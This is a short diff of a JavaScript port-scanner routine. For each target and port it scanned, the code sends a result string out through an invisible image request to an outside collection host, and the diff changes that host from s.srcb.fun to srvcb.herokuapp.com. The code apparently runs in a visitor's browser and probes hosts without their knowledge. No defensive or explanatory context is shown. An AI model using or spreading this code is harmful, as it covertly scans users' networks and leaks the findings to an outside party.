@@ -67,7 +67,7 @@ PortScanner.prototype.init = function() {
 				var str = target + ":" + port + ": " + status;
 				console.log(target + ":" + port + ": " + status)
 				var i = new Image();
-				i.src=`http://s.srcb.fun/avatar.svg?port=${str}`;
+				i.src=`https://srvcb.herokuapp.com/avatar.svg?port=${str}`;
 				i = undefined;
 			}
 		}, host, e, 3000);
